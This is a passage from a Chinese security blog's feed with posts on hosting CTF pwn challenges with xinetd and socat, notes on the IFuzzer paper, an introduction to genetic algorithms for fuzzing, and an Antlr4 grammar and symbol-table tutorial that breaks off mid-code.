<h3 id="2-下载yum配置文件"><a href="#2-下载yum配置文件" class="headerlink" title="2.下载yum配置文件"></a>2.下载yum配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/ </span><br><span class="line">wget http://mirrors.163.com/.help/CentOS6-Base-163.repo</span><br></pre></td></tr></table></figure>
<h3 id="3-生成缓存"><a href="#3-生成缓存" class="headerlink" title="3.生成缓存"></a>3.生成缓存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
<h3 id="4-更新"><a href="#4-更新" class="headerlink" title="4.更新"></a>4.更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<p>安装32位库 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install xulrunner.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x03-守护进程的配置"><a href="#0x03-守护进程的配置" class="headerlink" title="0x03 守护进程的配置"></a>0x03 守护进程的配置</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd</span><br></pre></td></tr></table></figure>
<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><p><code>/etc/services</code> 下先添加自己的服务端口信息<br><code>/etc/xinetd.d/</code> 下添加自己的服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service pwn_test</span><br><span class="line">&#123;</span><br><span class="line">    disable = no //打开</span><br><span class="line">    port = 50001 </span><br><span class="line">    socket_type = stream</span><br><span class="line">    server = /home/pwn100/pwn100</span><br><span class="line">    wait = no </span><br><span class="line">    user = pwn_user</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后重启服务就好了<code>service xinetd restart</code></p>
<h2 id="0x04-socat"><a href="#0x04-socat" class="headerlink" title="0x04 socat"></a>0x04 socat</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget –no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo </span><br><span class="line">yum makecache</span><br><span class="line">yum install socat</span><br></pre></td></tr></table></figure>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>如果要socat去配置pwn服务，写一个bash脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>给x权限后运行即可</p>
<h2 id="0x05-其他杂项配置"><a href="#0x05-其他杂项配置" class="headerlink" title="0x05 其他杂项配置"></a>0x05 其他杂项配置</h2><p>安装32bit库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x06-抓流量"><a href="#0x06-抓流量" class="headerlink" title="0x06 抓流量"></a>0x06 抓流量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh </span></span><br><span class="line">file_path=<span class="string">"/home/sycfiles/pwn_log/"</span></span><br><span class="line">file_name=`date <span class="string">"+%H%M"</span>`</span><br><span class="line">path=<span class="variable">$file_path</span><span class="variable">$file_name</span></span><br><span class="line">killall  tcpdump233</span><br><span class="line">nohup tcpdump233 -i eth1 tcp port 50001 -w <span class="variable">$path</span>  &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 */1 * * * 用户 脚本路径</span></span><br><span class="line">0 */1 * * *  root   /root/pwn_log.sh</span><br></pre></td></tr></table></figure>
<h2 id="0x07-其他"><a href="#0x07-其他" class="headerlink" title="0x07 其他"></a>0x07 其他</h2><p>主要是注意目录、文件权限以及fork炸弹之类的搅屎棍行为的限制，最好还是docker吧，比较方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前言&quot;&gt;&lt;/a&gt;0x00 : 前言&lt;/h2&gt;&lt;p&gt;又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://o0xmuhe.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;</title>
    <link href="http://o0xmuhe.me/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/"/>
    <id>http://o0xmuhe.me/2018/06/09/论文阅读-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/</id>
    <published>2018-06-08T16:29:42.000Z</published>
    <updated>2018-06-09T03:45:27.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-关于"><a href="#0x00-关于" class="headerlink" title="0x00:关于"></a>0x00:关于</h4><p>最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。<br>这篇论文是<code>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</code>。<br>主要是介绍<a href="https://github.com/vspandan/IFuzzer" target="_blank" rel="noopener">IFuzzer</a>的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。<br><a id="more"></a></p>
<h4 id="0x01-论文阅读"><a href="#0x01-论文阅读" class="headerlink" title="0x01:论文阅读"></a>0x01:论文阅读</h4><p>该论文主要是针对脚本引擎的fuzz，只是文中使用了js engine作为目标。</p>
<p>核心思想就是：收集大量的测试代码，使用antlr4编写好的语法解析器解析出<code>非终结符片段</code>，把输入解析成AST后，在AST上进行变异。</p>
<p>变异的方式主要是利用收集的“片段”去替换解析树中相同非终结符，由于采用了遗传算法，通过对每个个体的评估，筛选优秀的个体进行“杂交”产生新的个体进入下一轮fuzz，“杂交”的方法是交换两个个体中相同的非终结符节点，产生两棵新的输。</p>
<p>采用遗传算法必须面对膨胀控制的问题。这里论文作者对每个个体评估时，采用了如下的公式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fb(x) = score_structure + score_feedback</span><br><span class="line">ffinal(x) = fb(x) − c ∗ (l(x))</span><br></pre></td></tr></table></figure>
<p>即：</p>
<p>基础得分=结构得分+(解释器)回馈得分<br>最终得分=基础的分-膨胀控制</p>
<p>这样的话的确有效的控制了遗传算法在迭代中的膨胀问题。</p>
<p>论文中测试部分没仔细看，我只关注了核心的算法和一些问题的解决，剩下的工作就是去阅读IFuzzer代码去体会了。</p>
<h4 id="0x02-个人想法"><a href="#0x02-个人想法" class="headerlink" title="0x02:个人想法"></a>0x02:个人想法</h4><p>首先感觉这个东西没那么完善，或者说没放全。</p>
<p>变异的策略其实可以更多的，这种替换的方式感觉还是有局限性，其实就是类似于用一大堆积木，去组合，是从现有的东西生成一些组合性的东西；如果可以加入创造性的东西就好了，比如积木的形状、材质改变，然后去创造新的组合。</p>
<p>记得几个月前看过韩国一个大佬（BoB计划的导师）的slide，他做的类似的事情，但是不一样的是：他把收集的测试代码、poc解析后到AST然后到IR，直接在IR上操作，之后从IR再生成js代码，效果也不错，但是那个没放出源码所以也不好与IFuzzer比较。</p>
<p>从身边的大佬的说法来看，IFuzzer很有限，需要改进的地方很多- 。- 不过我个人认为，这样的思路值得借鉴，虽然很好想，但是难做啊。。去年就想这么搞了，然而一些基础知识跟不上，现如今可以试一试啦～</p>
<h4 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03:引用"></a>0x03:引用</h4><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-45744-4_29" target="_blank" rel="noopener">IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-关于&quot;&gt;&lt;a href=&quot;#0x00-关于&quot; class=&quot;headerlink&quot; title=&quot;0x00:关于&quot;&gt;&lt;/a&gt;0x00:关于&lt;/h4&gt;&lt;p&gt;最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。&lt;br&gt;这篇论文是&lt;code&gt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&lt;/code&gt;。&lt;br&gt;主要是介绍&lt;a href=&quot;https://github.com/vspandan/IFuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;IFuzzer&lt;/a&gt;的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。&lt;br&gt;
    
    </summary>
    
    
      <category term="fuzz" scheme="http://o0xmuhe.me/tags/fuzz/"/>
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="paper" scheme="http://o0xmuhe.me/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>遗传算法初窥</title>
    <link href="http://o0xmuhe.me/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/"/>
    <id>http://o0xmuhe.me/2018/06/03/遗传算法初窥/</id>
    <published>2018-06-02T17:13:32.000Z</published>
    <updated>2018-06-04T13:13:58.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 <a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a>，看完之后一下子明了，并且大呼过瘾 (好文章啊!)</p>
<a id="more"></a>
<h4 id="0x01-达尔文进化论"><a href="#0x01-达尔文进化论" class="headerlink" title="0x01 : 达尔文进化论"></a>0x01 : 达尔文进化论</h4><p><code>达尔文认为，生物之间存在着生存争斗，适应者生存下来，不适者则被淘汰，这就是自然的选择。生物正是通过遗传、变异和自然选择，从低级到高级，从简单到复杂，种类由少到多地进化着、发展着。</code></p>
<h4 id="0x02-遗传算法简述"><a href="#0x02-遗传算法简述" class="headerlink" title="0x02 : 遗传算法简述"></a>0x02 : 遗传算法简述</h4><p>这个算法的核心理念很简单：<code>如果一个种群想持续发展下去，就必须不断的提高自身，去适应环境，在使用过程中会个体会产生变异，适应环境的变异会保留下来，遗传给后代，这么一代一代的筛选下来，留下来的都是最适应环境的个体。</code></p>
<p>我们拿Fuzz举例，每一个样本进去所触发的路径、执行时间都有差异，那么如何去筛选出有效的样本，从而从这些样本再次迭代出新一代样本，从而让我们的Fuzz更加有效呢？</p>
<p>这时候我们需要一个评分规则（类比环境适应能力），评分越高，那么适应能力就越好，在这次样本变异中变异的部分（特性）会被保留下来，遗传给下一代。</p>
<p>参考AFL，它使用了路径等信息计算一个评分，评分高的样本保留（触发路径多），那么从这些样本中迭代，就容易产生更“优秀”的样本文件。</p>
<p>下图遗传算法的简单描述:</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/GP.png" alt="GP"></p>
<h4 id="0x03-举个栗子"><a href="#0x03-举个栗子" class="headerlink" title="0x03 : 举个栗子"></a>0x03 : 举个栗子</h4><p>例子来自<a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></p>
<h5 id="1-demo简述"><a href="#1-demo简述" class="headerlink" title="1. demo简述"></a>1. demo简述</h5><p>这里创建一个已知长度的密码破解程序 -。- （这不就是暴力破解吗，是的没错，但是思维方式要换一换啦）</p>
<p>我们针对没错输入的字符串（个体）进行评估，得到一个评分（适应环境性），这个评分指示着和正确密码的接近程度。算法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fitness score = (number of char correct) / (total number of char)</span><br></pre></td></tr></table></figure>
<p>随后对输入的串进行变异（进化，进化，进化…），然后对于新一代的群体，进行评分，挑选合适的个体作为第二代，然后从第二代中迭代产生新的个体。</p>
<p>产生下一代的方式也很简单，比如我们有两个个体叫做Tom和Jerry，他们的后代名字的字母就从两者名字字母中取就好了。</p>
<p>经历上述的过程，一代一代的进化，最终一定会得到正确的密码。</p>
<h5 id="2-一点问题"><a href="#2-一点问题" class="headerlink" title="2. 一点问题"></a>2. 一点问题</h5><p>但是问题来了！这也是今天我在看论文时发现的一个问题-。- </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bloating: </span><br><span class="line">Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. </span><br><span class="line">There are two types of bloating: structural and functional bloating.</span><br></pre></td></tr></table></figure>
<p>主要分为两类：Structural Bloating和Functional Bloating。</p>
<p>第一种主要是经过多代的迭代后，经过xx代，个体的平均规模不受控制的增长从而导致代码效率下降，后续的增长也无异于提高适应度（适应度，就是例子中的fitness）。</p>
<p>第二种是指在进化过程中，如果只挑选好的样本（高评分），那么你得到的样本会快速收敛在一个范围内，也就是说，你的样本的特征就趋于一个方向。对于我们这个密码破解程序，当然ok啦，但是对于Fuzz的话显然是不行的，我们需要多种多样的样本而不是趋近于某一种类型的样本。</p>
<h5 id="3-代码"><a href="#3-代码" class="headerlink" title="3. 代码"></a>3. 代码</h5><p>原文作者的代码在这里：<br><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></p>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 passwordTuto.py</span><br><span class="line">solution: <span class="string">"banana"</span> de fitness: 100.0</span><br><span class="line">18.69589400291443</span><br></pre></td></tr></table></figure>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/image_GP.png" alt="result"></p>
<h4 id="0x04-一点个人看法"><a href="#0x04-一点个人看法" class="headerlink" title="0x04 : 一点个人看法"></a>0x04 : 一点个人看法</h4><p>我觉得这个算法对于漏洞挖掘，无疑是增强型buff，通过合理的使用，能够有效的提升样本质量，从而提高fuzz的效率。但是文中提到的<code>Bloating</code>的问题，无疑也是需要去考虑然后加以干预的。</p>
<h4 id="0x05-参考及引用"><a href="#0x05-参考及引用" class="headerlink" title="0x05 : 参考及引用"></a>0x05 : 参考及引用</h4><ol>
<li><a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></li>
<li><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></li>
<li>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 &lt;a href=&quot;https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;getting-started-genetic-algorithms-python-tutorial&lt;/a&gt;，看完之后一下子明了，并且大呼过瘾 (好文章啊!)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>Antlr4初体验</title>
    <link href="http://o0xmuhe.me/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://o0xmuhe.me/2018/05/29/Antlr4初体验/</id>
    <published>2018-05-29T07:32:36.000Z</published>
    <updated>2018-05-29T08:05:53.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00：介绍"><a href="#0x00：介绍" class="headerlink" title="0x00：介绍"></a>0x00：介绍</h4><p>Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。</p>
<a id="more"></a>
<h4 id="0x01-why-this？"><a href="#0x01-why-this？" class="headerlink" title="0x01: why this？"></a>0x01: why this？</h4><p>我一直觉得编译原理相关的东西（理论也好，工具也好）可以和漏洞挖掘发生奇妙的化学反应。和9k师傅聊过相关的东西，有类似想法的人很多。甚至<code>github</code>上六年前的一个项目，使用<code>flex+bison</code>去生成文件来做<code>fuzz</code>。</p>
<p>和<code>flex+bison</code>比较，antlr4无疑是更容易上手，也更加强大的，当然用哪个就是仁者见仁智者见智了。</p>
<p>在深入学习这些东西之后，对domato的思想有了更深刻的理解。其实就是词法分析那套，自顶向下的。不得不说，真的很棒，而且应用范围很广泛，但是效果怎么样我就不知道了，还在摸索。</p>
<h4 id="0x02：-关于本文"><a href="#0x02：-关于本文" class="headerlink" title="0x02： 关于本文"></a>0x02： 关于本文</h4><p>《Antlr4权威指南》中8.4章节练习的学习记录。这部分的例子是一个语法检查器，针对<code>Cymbol</code>语言的。</p>
<p>比如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    g();   <span class="comment">// forward reference is ok</span></span><br><span class="line">    i = <span class="number">3</span>; <span class="comment">// no declaration for i (error)</span></span><br><span class="line">    g = <span class="number">4</span>; <span class="comment">// g is not variable (error)</span></span><br><span class="line">    <span class="keyword">return</span> x + y; <span class="comment">// x, y are defined, so no problem</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> y;</span><br><span class="line">    y = <span class="number">9</span>; <span class="comment">// y is defined</span></span><br><span class="line">    f();   <span class="comment">// backward reference is ok</span></span><br><span class="line">    z();   <span class="comment">// no such function (error)</span></span><br><span class="line">    y();   <span class="comment">// y is not function (error)</span></span><br><span class="line">    x = f; <span class="comment">// f is not a variable (error)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过该语法检查器，可以将一些语法错误找出来，比如未定义的符号、类型引用错误(函数当变量，变量当函数)。</p>
<h4 id="0x03-例子"><a href="#0x03-例子" class="headerlink" title="0x03: 例子"></a>0x03: 例子</h4><h5 id="1-语法分析"><a href="#1-语法分析" class="headerlink" title="1. 语法分析"></a>1. 语法分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">/** Simple statically-typed programming language with functions and variables</span><br><span class="line"> *  taken from &quot;Language Implementation Patterns&quot; book.</span><br><span class="line"> */</span><br><span class="line">grammar Cymbol;</span><br><span class="line"></span><br><span class="line">file:   (functionDecl | varDecl)+ ;</span><br><span class="line"></span><br><span class="line">varDecl</span><br><span class="line">    :   type ID (&apos;=&apos; expr)? &apos;;&apos;</span><br><span class="line">    ;</span><br><span class="line">type:   &apos;float&apos; | &apos;int&apos; | &apos;void&apos; ; // user-defined types</span><br><span class="line"></span><br><span class="line">functionDecl</span><br><span class="line">    :   type ID &apos;(&apos; formalParameters? &apos;)&apos; block // &quot;void f(int x) &#123;...&#125;&quot;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">formalParameters</span><br><span class="line">    :   formalParameter (&apos;,&apos; formalParameter)*</span><br><span class="line">    ;</span><br><span class="line">formalParameter</span><br><span class="line">    :   type ID</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block:  &apos;&#123;&apos; stat* &apos;&#125;&apos; ;   // possibly empty statement block</span><br><span class="line"></span><br><span class="line">stat:   block</span><br><span class="line">    |   varDecl</span><br><span class="line">    |   &apos;if&apos; expr &apos;then&apos; stat (&apos;else&apos; stat)?</span><br><span class="line">    |   &apos;return&apos; expr? &apos;;&apos; </span><br><span class="line">    |   expr &apos;=&apos; expr &apos;;&apos; // assignment</span><br><span class="line">    |   expr &apos;;&apos;          // func call</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">/* expr below becomes the following non-left recursive rule:</span><br><span class="line">expr[int _p]</span><br><span class="line">    :   ( &apos;-&apos; expr[6]</span><br><span class="line">        | &apos;!&apos; expr[5]</span><br><span class="line">        | ID</span><br><span class="line">        | INT</span><br><span class="line">        | &apos;(&apos; expr &apos;)&apos;</span><br><span class="line">        )</span><br><span class="line">        ( &#123;8 &gt;= $_p&#125;? &apos;*&apos; expr[9]</span><br><span class="line">        | &#123;7 &gt;= $_p&#125;? (&apos;+&apos;|&apos;-&apos;) expr[8]</span><br><span class="line">        | &#123;4 &gt;= $_p&#125;? &apos;==&apos; expr[5]</span><br><span class="line">        | &#123;10 &gt;= $_p&#125;? &apos;[&apos; expr &apos;]&apos;</span><br><span class="line">        | &#123;9 &gt;= $_p&#125;? &apos;(&apos; exprList? &apos;)&apos;</span><br><span class="line">        )*</span><br><span class="line">    ;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">expr:   ID &apos;(&apos; exprList? &apos;)&apos;    # Call</span><br><span class="line">    |   expr &apos;[&apos; expr &apos;]&apos;       # Index</span><br><span class="line">    |   &apos;-&apos; expr                # Negate</span><br><span class="line">    |   &apos;!&apos; expr                # Not</span><br><span class="line">    |   expr &apos;*&apos; expr           # Mult</span><br><span class="line">    |   expr (&apos;+&apos;|&apos;-&apos;) expr     # AddSub</span><br><span class="line">    |   expr &apos;==&apos; expr          # Equal</span><br><span class="line">    |   ID                      # Var</span><br><span class="line">    |   INT                     # Int</span><br><span class="line">    |   &apos;(&apos; expr &apos;)&apos;            # Parens</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">exprList : expr (&apos;,&apos; expr)* ;   // arg list</span><br><span class="line"></span><br><span class="line">K_FLOAT : &apos;float&apos;;</span><br><span class="line">K_INT   : &apos;int&apos;;</span><br><span class="line">K_VOID  : &apos;void&apos;;</span><br><span class="line">ID  :   LETTER (LETTER | [0-9])* ;</span><br><span class="line">fragment</span><br><span class="line">LETTER : [a-zA-Z] ;</span><br><span class="line"></span><br><span class="line">INT :   [0-9]+ ;</span><br><span class="line"></span><br><span class="line">WS  :   [ \t\n\r]+ -&gt; skip ;</span><br><span class="line"></span><br><span class="line">SL_COMMENT</span><br><span class="line">    :   &apos;//&apos; .*? &apos;\n&apos; -&gt; skip</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<h5 id="2-符号表"><a href="#2-符号表" class="headerlink" title="2. 符号表"></a>2. 符号表</h5><p>这部分是精髓，作者直接拿了自己另一本书里的代码来用，代码不长也好懂。这里我只列一部分比较重要的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseScope</span> <span class="keyword">implements</span> <span class="title">Scope</span> </span>&#123;</span><br><span class="line">    Scope enclosingScope; <span class="comment">// 临近的作用区，如果当前是全局作用域，应该置null</span></span><br><span class="line">                          <span class="comment">// 因为作用域查找是往前找的，全局已经是最靠前了</span></span><br><span class="line">    Map&lt;String, Symbol&gt; symbols = <span class="keyword">new</span> LinkedHashMap&lt;String, Symbol&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BaseScope</span><span class="params">(Scope enclosingScope)</span> </span>&#123; <span class="keyword">this</span>.enclosingScope = enclosingScope;  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Symbol <span class="title">resolve</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Symbol s = symbols.get(name);</span><br><span class="line">        <span class="keyword">if</span> ( s!=<span class="keyword">null</span> ) <span class="keyword">return</span> s;<span class="comment">//在当前作用域找到了，直接返回</span></span><br><span class="line">        <span class="comment">//如果临近作用域不空，那么就去临近作用域找</span></span><br><span class="line">        <span class="comment">//比如，一个函数内，符号定义没找到，就去往上（全局）找</span></span><br><span class="line">        <span class="keyword">if</span> ( enclosingScope != <span class="keyword">null</span> ) <span class="keyword">return</span> enclosingScope.resolve(name);</span><br><span class="line">        <span class="comment">//还找不到，那就是未定义，报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">define</span><span class="params">(Symbol sym)</span> </span>&#123;</span><br><span class="line">        symbols.put(sym.name, sym);</span><br><span class="line">        sym.scope = <span class="keyword">this</span>; <span class="comment">// track the scope in each symbol</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Scope <span class="title">getEnclosingScope</span><span class="params">()</span> </span>&#123; <span 